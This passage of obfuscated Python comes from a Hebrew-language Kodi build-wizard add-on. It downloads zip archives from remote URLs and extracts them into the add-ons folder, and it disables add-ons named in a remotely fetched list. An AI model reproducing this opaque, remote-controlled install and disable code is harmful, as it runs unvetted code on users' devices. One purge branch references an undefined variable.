		if OOOO00OO00O0OO000 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5126
		elif len (OOOO00OO00O0OO000 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5127
		else :#line:5128
			for OOOOO0O0OO0O00OOO in OOOO00OO00O0OO000 :wiz .purgeDb (OOOO000OO0OO00OOO [OOOOO0O0OO0O00OOO ])#line:5129
	else :#line:5130
		OOOO00OO00O0OO000 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O00OOOOO0OO0O000O )#line:5131
		if OOOO00OO00O0OO000 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5132
		else :wiz .purgeDb (OOOO000OO0OO00OOO [OOOOO0O0OO0O00OOO ])#line:5133
def fastupdatefirstbuild (OO0O00000000OO0O0 ):#line:5139
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5141
	if ENABLE =='Yes':#line:5142
		if not NOTIFY =='true':#line:5143
			O0O0OO0000OOO0O00 =wiz .workingURL (NOTIFICATION )#line:5144
			if O0O0OO0000OOO0O00 ==True :#line:5145
				O00O0O00O000O00O0 ,O00OO000O0000O00O =wiz .splitNotify (NOTIFICATION )#line:5146
				if not O00O0O00O000O00O0 ==False :#line:5148
					try :#line:5149
						O00O0O00O000O00O0 =int (O00O0O00O000O00O0 );OO0O00000000OO0O0 =int (OO0O00000000OO0O0 )#line:5150
						checkidupdate ()#line:5151
						wiz .setS ("notedismiss","true")#line:5152
						if O00O0O00O000O00O0 ==OO0O00000000OO0O0 :#line:5153
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O00O0O00O000O00O0 ),xbmc .LOGNOTICE )#line:5154
						elif O00O0O00O000O00O0 >OO0O00000000OO0O0 :#line:5156
							wiz .log ("[Notifications] id: %s"%str (O00O0O00O000O00O0 ),xbmc .LOGNOTICE )#line:5157
							wiz .setS ('noteid',str (O00O0O00O000O00O0 ))#line:5158
							wiz .setS ("notedismiss","true")#line:5159
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5162
					except Exception as OOO00000O0O00O0O0 :#line:5163
						wiz .log ("Error on Notifications Window: %s"%str (OOO00000O0O00O0O0 ),xbmc .LOGERROR )#line:5164
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5166
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O0O0OO0000OOO0O00 ),xbmc .LOGNOTICE )#line:5167
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5168
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5169
def checkidupdate ():#line:5175
				wiz .setS ("notedismiss","true")#line:5177
				O000OOO00O000OO0O =wiz .workingURL (NOTIFICATION )#line:5178
				O000O00O0O00O0O0O =" Kodi Premium"#line:5180
				OOO00OO0O000O0OO0 =wiz .checkBuild (O000O00O0O00O0O0O ,'gui')#line:5181
				O00OOO00O0O00OO00 =O000O00O0O00O0O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5182
				if not wiz .workingURL (OOO00OO0O000O0OO0 )==True :return #line:5183
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5184
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O000O00O0O00O0O0O ),'','אנא המתן')#line:5185
				O00OOO000O00OO000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00OOO00O0O00OO00 )#line:5186
				try :os .remove (O00OOO000O00OO000 )#line:5187
				except :pass #line:5188
				logging .warning (OOO00OO0O000O0OO0 )#line:5189
				if 'google'in OOO00OO0O000O0OO0 :#line:5190
				   OO0OO0OO0OOO000O0 =googledrive_download (OOO00OO0O000O0OO0 ,O00OOO000O00OO000 ,DP ,wiz .checkBuild (O000O00O0O00O0O0O ,'filesize'))#line:5191
				else :#line:5194
				  downloader .download (OOO00OO0O000O0OO0 ,O00OOO000O00OO000 ,DP )#line:5195
				xbmc .sleep (100 )#line:5196
				OO000OOOOO0OOO000 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000O00O0O00O0O0O )#line:5197
				DP .update (0 ,OO000OOOOO0OOO000 ,'','אנא המתן')#line:5198
				extract .all (O00OOO000O00OO000 ,HOME ,DP ,title =OO000OOOOO0OOO000 )#line:5199
				DP .close ()#line:5200
				wiz .defaultSkin ()#line:5201
				wiz .lookandFeelData ('save')#line:5202
				if KODIV >=18 :#line:5203
					skindialogsettind18 ()#line:5204
				if INSTALLMETHOD ==1 :O0OO0O0OOOOO00O0O =1 #line:5207
				elif INSTALLMETHOD ==2 :O0OO0O0OOOOO00O0O =0 #line:5208
				else :DP .close ()#line:5209
def gaiaserenaddon ():#line:5211
  OOO000O000O0OO000 =(ADDON .getSetting ("gaiaseren"))#line:5212
  O0O00O0OO0O0OOO00 =(ADDON .getSetting ("auto_rd"))#line:5213
  if OOO000O000O0OO000 =='true'and O0O00O0OO0O0OOO00 =='true':#line:5214
    O0O00OO00OO0OOOO0 =(NEWFASTUPDATE )#line:5215
    OOO0O0000O0OO0OOO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5216
    O000OOO0O0O0O000O =xbmcgui .DialogProgress ()#line:5217
    O000OOO0O0O0O000O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5218
    OO0OOOO00O0O0OOOO =os .path .join (PACKAGES ,'isr.zip')#line:5219
    OO0OOOO0OO00000O0 =urllib2 .Request (O0O00OO00OO0OOOO0 )#line:5220
    O00000000OO0000O0 =urllib2 .urlopen (OO0OOOO0OO00000O0 )#line:5221
    O0OO0O0O0OOO00OO0 =xbmcgui .DialogProgress ()#line:5223
    O0OO0O0O0OOO00OO0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5224
    O0OO0O0O0OOO00OO0 .update (0 )#line:5225
    OO0O00OOOOO000000 =open (OO0OOOO00O0O0OOOO ,'wb')#line:5227
    try :#line:5229
      O0000000OO00O00O0 =O00000000OO0000O0 .info ().getheader ('Content-Length').strip ()#line:5230
      O0O00O00OO000OO0O =True #line:5231
    except AttributeError :#line:5232
          O0O00O00OO000OO0O =False #line:5233
    if O0O00O00OO000OO0O :#line:5235
          O0000000OO00O00O0 =int (O0000000OO00O00O0 )#line:5236
    O0O0OOOOOOO00O0OO =0 #line:5238
    O000OOO00OOOO0O00 =time .time ()#line:5239
    while True :#line:5240
          OO0OOO000OOO0OO00 =O00000000OO0000O0 .read (8192 )#line:5241
          if not OO0OOO000OOO0OO00 :#line:5242
              sys .stdout .write ('\n')#line:5243
              break #line:5244
          O0O0OOOOOOO00O0OO +=len (OO0OOO000OOO0OO00 )#line:5246
          OO0O00OOOOO000000 .write (OO0OOO000OOO0OO00 )#line:5247
          if not O0O00O00OO000OO0O :#line:5249
              O0000000OO00O00O0 =O0O0OOOOOOO00O0OO #line:5250
          if O0OO0O0O0OOO00OO0 .iscanceled ():#line:5251
             O0OO0O0O0OOO00OO0 .close ()#line:5252
             try :#line:5253
              os .remove (OO0OOOO00O0O0OOOO )#line:5254
             except :#line:5255
              pass #line:5256
             break #line:5257
          OOO0OO00OOO000O00 =float (O0O0OOOOOOO00O0OO )/O0000000OO00O00O0 #line:5258
          OOO0OO00OOO000O00 =round (OOO0OO00OOO000O00 *100 ,2 )#line:5259
          OO0OO00O0O00OOO00 =O0O0OOOOOOO00O0OO /(1024 *1024 )#line:5260
          OOOO0OOO00O00OOOO =O0000000OO00O00O0 /(1024 *1024 )#line:5261
          O00O0O0OO0000OO00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0OO00O0O00OOO00 ,'teal',OOOO0OOO00O00OOOO )#line:5262
          if (time .time ()-O000OOO00OOOO0O00 )>0 :#line:5263
            OO0O0OOO000O0O0OO =O0O0OOOOOOO00O0OO /(time .time ()-O000OOO00OOOO0O00 )#line:5264
            OO0O0OOO000O0O0OO =OO0O0OOO000O0O0OO /1024 #line:5265
          else :#line:5266
           OO0O0OOO000O0O0OO =0 #line:5267
          O000000OOO0OOOOO0 ='KB'#line:5268
          if OO0O0OOO000O0O0OO >=1024 :#line:5269
             OO0O0OOO000O0O0OO =OO0O0OOO000O0O0OO /1024 #line:5270
             O000000OOO0OOOOO0 ='MB'#line:5271
          if OO0O0OOO000O0O0OO >0 and not OOO0OO00OOO000O00 ==100 :#line:5272
              O0OOOO00OOOO0OOO0 =(O0000000OO00O00O0 -O0O0OOOOOOO00O0OO )/OO0O0OOO000O0O0OO #line:5273
          else :#line:5274
              O0OOOO00OOOO0OOO0 =0 #line:5275
          OOOO0OOO0OOOOO000 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0O0OOO000O0O0OO ,O000000OOO0OOOOO0 )#line:5276
          O0OO0O0O0OOO00OO0 .update (int (OOO0OO00OOO000O00 ),O00O0O0OO0000OO00 ,OOOO0OOO0OOOOO000 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5278
    OOO0O0OO0O0OOO000 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5281
    OO0O00OOOOO000000 .close ()#line:5284
    extract .all (OO0OOOO00O0O0OOOO ,OOO0O0OO0O0OOO000 ,O0OO0O0O0OOO00OO0 )#line:5285
    try :#line:5289
      os .remove (OO0OOOO00O0O0OOOO )#line:5290
    except :#line:5291
      pass #line:5292
def iptvsimpldownpc ():#line:5293
    O0O00O000O00OOOO0 =(IPTVSIMPL18PC )#line:5295
    O00OOO000O00O0OO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5296
    OO0000OO0O0OO0OOO =xbmcgui .DialogProgress ()#line:5297
    OO0000OO0O0OO0OOO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5298
    OOO0OOOOO000OO000 =os .path .join (PACKAGES ,'isr.zip')#line:5299
    OOO00O0OOO0O0O0OO =urllib2 .Request (O0O00O000O00OOOO0 )#line:5300
    O0O0O00O0OO00OOOO =urllib2 .urlopen (OOO00O0OOO0O0O0OO )#line:5301
    O000OOOOOOO0O0OOO =xbmcgui .DialogProgress ()#line:5303
    O000OOOOOOO0O0OOO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5304
    O000OOOOOOO0O0OOO .update (0 )#line:5305
    OOO0OO0000O00O0O0 =open (OOO0OOOOO000OO000 ,'wb')#line:5307
    try :#line:5309
      O0OO0000O0O0O0OOO =O0O0O00O0OO00OOOO .info ().getheader ('Content-Length').strip ()#line:5310
      O0OO0OO00OOOO0O00 =True #line:5311
    except AttributeError :#line:5312
          O0OO0OO00OOOO0O00 =False #line:5313
    if O0OO0OO00OOOO0O00 :#line:5315
          O0OO0000O0O0O0OOO =int (O0OO0000O0O0O0OOO )#line:5316
    OOO0O0O0O00O0OO00 =0 #line:5318
    OO0OOOO0OOOO00000 =time .time ()#line:5319
    while True :#line:5320
          OOO0O00OOOOO00OO0 =O0O0O00O0OO00OOOO .read (8192 )#line:5321
          if not OOO0O00OOOOO00OO0 :#line:5322
              sys .stdout .write ('\n')#line:5323
              break #line:5324
          OOO0O0O0O00O0OO00 +=len (OOO0O00OOOOO00OO0 )#line:5326
          OOO0OO0000O00O0O0 .write (OOO0O00OOOOO00OO0 )#line:5327
          if not O0OO0OO00OOOO0O00 :#line:5329
              O0OO0000O0O0O0OOO =OOO0O0O0O00O0OO00 #line:5330
          if O000OOOOOOO0O0OOO .iscanceled ():#line:5331
             O000OOOOOOO0O0OOO .close ()#line:5332
             try :#line:5333
              os .remove (OOO0OOOOO000OO000 )#line:5334
             except :#line:5335
              pass #line:5336
             break #line:5337
          O0OOOOO00O0OOOOOO =float (OOO0O0O0O00O0OO00 )/O0OO0000O0O0O0OOO #line:5338
          O0OOOOO00O0OOOOOO =round (O0OOOOO00O0OOOOOO *100 ,2 )#line:5339
          O0O0OO00O0OO000O0 =OOO0O0O0O00O0OO00 /(1024 *1024 )#line:5340
          OO00O00000OO000OO =O0OO0000O0O0O0OOO /(1024 *1024 )#line:5341
          O0000OOO0O000OO0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O0OO00O0OO000O0 ,'teal',OO00O00000OO000OO )#line:5342
          if (time .time ()-OO0OOOO0OOOO00000 )>0 :#line:5343
            O0O00O0O0OO0OO00O =OOO0O0O0O00O0OO00 /(time .time ()-OO0OOOO0OOOO00000 )#line:5344
            O0O00O0O0OO0OO00O =O0O00O0O0OO0OO00O /1024 #line:5345
          else :#line:5346
           O0O00O0O0OO0OO00O =0 #line:5347
          OO00O00O0O0O0O00O ='KB'#line:5348
          if O0O00O0O0OO0OO00O >=1024 :#line:5349
             O0O00O0O0OO0OO00O =O0O00O0O0OO0OO00O /1024 #line:5350
             OO00O00O0O0O0O00O ='MB'#line:5351
          if O0O00O0O0OO0OO00O >0 and not O0OOOOO00O0OOOOOO ==100 :#line:5352
              O00O0O0O0O0O0OOO0 =(O0OO0000O0O0O0OOO -OOO0O0O0O00O0OO00 )/O0O00O0O0OO0OO00O #line:5353
          else :#line:5354
              O00O0O0O0O0O0OOO0 =0 #line:5355
          O000OOO0O000OOOOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O00O0O0OO0OO00O ,OO00O00O0O0O0O00O )#line:5356
          O000OOOOOOO0O0OOO .update (int (O0OOOOO00O0OOOOOO ),O0000OOO0O000OO0O ,O000OOO0O000OOOOO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5358
    OOO00OOO0O0O0OO0O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5361
    OOO0OO0000O00O0O0 .close ()#line:5364
    extract .all (OOO0OOOOO000OO000 ,OOO00OOO0O0O0OO0O ,O000OOOOOOO0O0OOO )#line:5365
    try :#line:5369
      os .remove (OOO0OOOOO000OO000 )#line:5370
    except :#line:5371
      pass #line:5372
def iptvsimpldown ():#line:5373
    O00OOO0OOOO000OOO =(IPTV18 )#line:5375
    OO000OO0O000O0O0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5376
    O0O0O00O00000O0O0 =xbmcgui .DialogProgress ()#line:5377
    O0O0O00O00000O0O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5378
    O00O0O00O000O0OO0 =os .path .join (PACKAGES ,'isr.zip')#line:5379
    OOOO0OOO0O000O0O0 =urllib2 .Request (O00OOO0OOOO000OOO )#line:5380
    O0OOO00OOOO0OOO0O =urllib2 .urlopen (OOOO0OOO0O000O0O0 )#line:5381
    O000OO000O00O0000 =xbmcgui .DialogProgress ()#line:5383
    O000OO000O00O0000 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5384
    O000OO000O00O0000 .update (0 )#line:5385
    OOOOO000OO0O0O000 =open (O00O0O00O000O0OO0 ,'wb')#line:5387
    try :#line:5389
      OO000O0O0O00O0O00 =O0OOO00OOOO0OOO0O .info ().getheader ('Content-Length').strip ()#line:5390
      OOOOOOOO0OO0O0OOO =True #line:5391
    except AttributeError :#line:5392
          OOOOOOOO0OO0O0OOO =False #line:5393
    if OOOOOOOO0OO0O0OOO :#line:5395
          OO000O0O0O00O0O00 =int (OO000O0O0O00O0O00 )#line:5396
    O0OO00O0O000O00OO =0 #line:5398
    OOOOOOO000OOO0OOO =time .time ()#line:5399
    while True :#line:5400
          O00OO00OOO0O0O0OO =O0OOO00OOOO0OOO0O .read (8192 )#line:5401
          if not O00OO00OOO0O0O0OO :#line:5402
              sys .stdout .write ('\n')#line:5403
              break #line:5404
          O0OO00O0O000O00OO +=len (O00OO00OOO0O0O0OO )#line:5406
          OOOOO000OO0O0O000 .write (O00OO00OOO0O0O0OO )#line:5407
          if not OOOOOOOO0OO0O0OOO :#line:5409
              OO000O0O0O00O0O00 =O0OO00O0O000O00OO #line:5410
          if O000OO000O00O0000 .iscanceled ():#line:5411
             O000OO000O00O0000 .close ()#line:5412
             try :#line:5413
              os .remove (O00O0O00O000O0OO0 )#line:5414
             except :#line:5415
              pass #line:5416
             break #line:5417
          O0OOOO0O0O0O0OO0O =float (O0OO00O0O000O00OO )/OO000O0O0O00O0O00 #line:5418
          O0OOOO0O0O0O0OO0O =round (O0OOOO0O0O0O0OO0O *100 ,2 )#line:5419
          OOO00O0OOO0O00000 =O0OO00O0O000O00OO /(1024 *1024 )#line:5420
          OOOO0000O0O0OOOO0 =OO000O0O0O00O0O00 /(1024 *1024 )#line:5421
          O0OOO0O00O00O000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO00O0OOO0O00000 ,'teal',OOOO0000O0O0OOOO0 )#line:5422
          if (time .time ()-OOOOOOO000OOO0OOO )>0 :#line:5423
            OO0OOO00OOO0OO0O0 =O0OO00O0O000O00OO /(time .time ()-OOOOOOO000OOO0OOO )#line:5424
            OO0OOO00OOO0OO0O0 =OO0OOO00OOO0OO0O0 /1024 #line:5425
          else :#line:5426
           OO0OOO00OOO0OO0O0 =0 #line:5427
          OO000OOO00OOO0O0O ='KB'#line:5428
          if OO0OOO00OOO0OO0O0 >=1024 :#line:5429
             OO0OOO00OOO0OO0O0 =OO0OOO00OOO0OO0O0 /1024 #line:5430
             OO000OOO00OOO0O0O ='MB'#line:5431
          if OO0OOO00OOO0OO0O0 >0 and not O0OOOO0O0O0O0OO0O ==100 :#line:5432
              OO00O00OOOO000000 =(OO000O0O0O00O0O00 -O0OO00O0O000O00OO )/OO0OOO00OOO0OO0O0 #line:5433
          else :#line:5434
              OO00O00OOOO000000 =0 #line:5435
          O00O0OOO00O0O0000 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0OOO00OOO0OO0O0 ,OO000OOO00OOO0O0O )#line:5436
          O000OO000O00O0000 .update (int (O0OOOO0O0O0O0OO0O ),O0OOO0O00O00O000O ,O00O0OOO00O0O0000 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5438
    O0O0O00O0OOO0O0O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5441
    OOOOO000OO0O0O000 .close ()#line:5444
    extract .all (O00O0O00O000O0OO0 ,O0O0O00O0OOO0O0O0 ,O000OO000O00O0000 )#line:5445
    try :#line:5449
      os .remove (O00O0O00O000O0OO0 )#line:5450
    except :#line:5451
      pass #line:5452
def testnotify ():#line:5453
	O0OO0O00000OOOO00 =wiz .workingURL (NOTIFICATION )#line:5454
	if O0OO0O00000OOOO00 ==True :#line:5455
		try :#line:5456
			OOOOO000OO0OOOOO0 ,OO0OOO0OO00OOO0OO =wiz .splitNotify (NOTIFICATION )#line:5457
			if OOOOO000OO0OOOOO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5458
			if STARTP2 ()=='ok':#line:5459
				notify .notification (OO0OOO0OO00OOO0OO ,True )#line:5460
		except Exception as O0OO00O0OOOOO0OO0 :#line:5461
			wiz .log ("Error on Notifications Window: %s"%str (O0OO00O0OOOOO0OO0 ),xbmc .LOGERROR )#line:5462
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5463
def testnotify2 ():#line:5464
	O000O00O00000O00O =wiz .workingURL (NOTIFICATION2 )#line:5465
	if O000O00O00000O00O ==True :#line:5466
		try :#line:5467
			OO0000O0O0OOOOO00 ,O00O0O0OOO0O0OO0O =wiz .splitNotify (NOTIFICATION2 )#line:5468
			if OO0000O0O0OOOOO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5469
			if STARTP2 ()=='ok':#line:5470
				notify .notification2 (O00O0O0OOO0O0OO0O ,True )#line:5471
		except Exception as O0OOO0OO0OO000OO0 :#line:5472
			wiz .log ("Error on Notifications Window: %s"%str (O0OOO0OO0OO000OO0 ),xbmc .LOGERROR )#line:5473
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5474
def testnotify3 ():#line:5475
	OO00O00OOO00OOO0O =wiz .workingURL (NOTIFICATION3 )#line:5476
	if OO00O00OOO00OOO0O ==True :#line:5477
		try :#line:5478
			O00O0O0OOOO00O00O ,OO0OOOOO000OOOOOO =wiz .splitNotify (NOTIFICATION3 )#line:5479
			if O00O0O0OOOO00O00O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5480
			if STARTP2 ()=='ok':#line:5481
				notify .notification3 (OO0OOOOO000OOOOOO ,True )#line:5482
		except Exception as OO0O000000OO00OO0 :#line:5483
			wiz .log ("Error on Notifications Window: %s"%str (OO0O000000OO00OO0 ),xbmc .LOGERROR )#line:5484
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5485
def infobuild ():#line:5486
	O0OO0O00OO00OO000 =wiz .workingURL (NOTIFICATION )#line:5487
	if O0OO0O00OO00OO000 ==True :#line:5488
		try :#line:5489
			OO0O0000O000OOO00 ,OO0O0OOO000000OOO =wiz .splitNotify (NOTIFICATION )#line:5490
			if OO0O0000O000OOO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5491
			if STARTP2 ()=='ok':#line:5492
				notify .updateinfo (OO0O0OOO000000OOO ,True )#line:5493
		except Exception as OOOO0OO0000OOOOOO :#line:5494
			wiz .log ("Error on Notifications Window: %s"%str (OOOO0OO0000OOOOOO ),xbmc .LOGERROR )#line:5495
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5496
def servicemanual ():#line:5497
	O000OOOOO0OO0O0OO =wiz .workingURL (HELPINFO )#line:5498
	if O000OOOOO0OO0O0OO ==True :#line:5499
		try :#line:5500
			O0000O00O00OOOO0O ,O00O0OO0O00O0O0O0 =wiz .splitNotify (HELPINFO )#line:5501
			if O0000O00O00OOOO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5502
			notify .helpinfo (O00O0OO0O00O0O0O0 ,True )#line:5503
		except Exception as O0000OOOO0O0OOOOO :#line:5504
			wiz .log ("Error on Notifications Window: %s"%str (O0000OOOO0O0OOOOO ),xbmc .LOGERROR )#line:5505
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5506
def testupdate ():#line:5508
	if BUILDNAME =="":#line:5509
		notify .updateWindow ()#line:5510
	else :#line:5511
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5512
def testfirst ():#line:5514
	notify .firstRun ()#line:5515
def testfirstRun ():#line:5517
	notify .firstRunSettings ()#line:5518
def fastinstall ():#line:5521
	notify .firstRuninstall ()#line:5522
def addDir (OO0OO0000OO00OO0O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5529
	OO0O000O00OOOO000 =sys .argv [0 ]#line:5530
	if not mode ==None :OO0O000O00OOOO000 +="?mode=%s"%urllib .quote_plus (mode )#line:5531
	if not name ==None :OO0O000O00OOOO000 +="&name="+urllib .quote_plus (name )#line:5532
	if not url ==None :OO0O000O00OOOO000 +="&url="+urllib .quote_plus (url )#line:5533
	OO0O0OO0OO0O00OOO =True #line:5534
	if themeit :OO0OO0000OO00OO0O =themeit %OO0OO0000OO00OO0O #line:5535
	O0OOO00OOO0000000 =xbmcgui .ListItem (OO0OO0000OO00OO0O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5536
	O0OOO00OOO0000000 .setInfo (type ="Video",infoLabels ={"Title":OO0OO0000OO00OO0O ,"Plot":description })#line:5537
	O0OOO00OOO0000000 .setProperty ("Fanart_Image",fanart )#line:5538
	if not menu ==None :O0OOO00OOO0000000 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5539
	OO0O0OO0OO0O00OOO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0O000O00OOOO000 ,listitem =O0OOO00OOO0000000 ,isFolder =True )#line:5540
	return OO0O0OO0OO0O00OOO #line:5541
def addFile (OOOO00OO0OOOO000O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5543
	OOO00OO0O0OOOOO00 =sys .argv [0 ]#line:5544
	if not mode ==None :OOO00OO0O0OOOOO00 +="?mode=%s"%urllib .quote_plus (mode )#line:5545
	if not name ==None :OOO00OO0O0OOOOO00 +="&name="+urllib .quote_plus (name )#line:5546
	if not url ==None :OOO00OO0O0OOOOO00 +="&url="+urllib .quote_plus (url )#line:5547
	O00O000OOO0O00O0O =True #line:5548
	if themeit :OOOO00OO0OOOO000O =themeit %OOOO00OO0OOOO000O #line:5549
	OOOO0O000OOO0O0OO =xbmcgui .ListItem (OOOO00OO0OOOO000O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5550
	OOOO0O000OOO0O0OO .setInfo (type ="Video",infoLabels ={"Title":OOOO00OO0OOOO000O ,"Plot":description })#line:5551
	OOOO0O000OOO0O0OO .setProperty ("Fanart_Image",fanart )#line:5552
	if not menu ==None :OOOO0O000OOO0O0OO .addContextMenuItems (menu ,replaceItems =overwrite )#line:5553
	O00O000OOO0O00O0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOO00OO0O0OOOOO00 ,listitem =OOOO0O000OOO0O0OO ,isFolder =False )#line:5554
	return O00O000OOO0O00O0O #line:5555
def get_params ():#line:5557
	OO00O000O0O000O00 =[]#line:5558
	O0OO0O0O0O000O0OO =sys .argv [2 ]#line:5559
	if len (O0OO0O0O0O000O0OO )>=2 :#line:5560
		OOO00O0O00000OO0O =sys .argv [2 ]#line:5561
		O00OOOOO0O0OOOOO0 =OOO00O0O00000OO0O .replace ('?','')#line:5562
		if (OOO00O0O00000OO0O [len (OOO00O0O00000OO0O )-1 ]=='/'):#line:5563
			OOO00O0O00000OO0O =OOO00O0O00000OO0O [0 :len (OOO00O0O00000OO0O )-2 ]#line:5564
		O0O00O0O00O000000 =O00OOOOO0O0OOOOO0 .split ('&')#line:5565
		OO00O000O0O000O00 ={}#line:5566
		for OOOO00O0OOO00OOO0 in range (len (O0O00O0O00O000000 )):#line:5567
			OO0OOO0O00O00O000 ={}#line:5568
			OO0OOO0O00O00O000 =O0O00O0O00O000000 [OOOO00O0OOO00OOO0 ].split ('=')#line:5569
			if (len (OO0OOO0O00O00O000 ))==2 :#line:5570
				OO00O000O0O000O00 [OO0OOO0O00O00O000 [0 ]]=OO0OOO0O00O00O000 [1 ]#line:5571
		return OO00O000O0O000O00 #line:5573
def remove_addons ():#line:5575
	try :#line:5576
			import json #line:5577
			OOO00OO00000O0O0O =urllib2 .urlopen (remove_url ).readlines ()#line:5578
			for O0OO0000O0OO00OOO in OOO00OO00000O0O0O :#line:5579
				O0000OOO0OO00OO00 =O0OO0000O0OO00OOO .split (':')[1 ].strip ()#line:5581
				O0O0O000000OOOOO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O0000OOO0OO00OO00 ,'false')#line:5582
				OOO0000O0O0000OOO =xbmc .executeJSONRPC (O0O0O000000OOOOO0 )#line:5583
